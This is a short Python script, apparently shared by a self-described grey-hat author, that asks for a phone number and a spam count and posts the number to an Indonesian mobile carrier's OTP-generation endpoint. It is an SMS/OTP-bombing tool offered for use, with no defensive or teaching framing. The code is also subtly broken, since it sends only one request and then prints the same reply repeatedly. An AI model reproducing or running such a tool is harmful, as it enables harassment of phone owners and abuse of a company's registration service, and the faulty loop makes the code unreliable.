import requests, os, sys
os.system('clear')
r = requests.Session()

ex = """\033[92m
 /$$   /$$ /$$$$$$$$ /$$      /$$ /$$$$$$$  /$$$$$$ /$$$$$$$$
| $$$ | $$| $$_____/| $$  /$ | $$| $$__  $$|_  $$_/| $$_____/
| $$$$| $$| $$      | $$ /$$$| $$| $$  \ $$  | $$  | $$      
| $$ $$ $$| $$$$$   | $$/$$ $$ $$| $$$$$$$   | $$  | $$$$$   
| $$  $$$$| $$__/   | $$$$_  $$$$| $$__  $$  | $$  | $$__/   
| $$\  $$$| $$      | $$$/ \  $$$| $$  \ $$  | $$  | $$      
| $$ \  $$| $$$$$$$$| $$/   \  $$| $$$$$$$/ /$$$$$$| $$$$$$$$
|__/  \__/|________/|__/     \__/|_______/ |______/|________/
\033[0m
\033[91m
~#: AUTHOR   : ARJUN-NEWBIE
~#: YOUTUBE  :\033[0m\033[97m ARJUN-NEWBIE
~#: TEAM     : KEBUMEN-GREY-HAT

"""
print(ex)

url = "https://registrasi.tri.co.id/daftar/GenerateOTP"

no = raw_input("\033[92mNOMOR : ")
jml = int(input("JUMLAH SPAM : "))

data = {
"msisdn":no
}

result = r.post(url, data=data).text
for c in range(int(jml)):
    print (result)
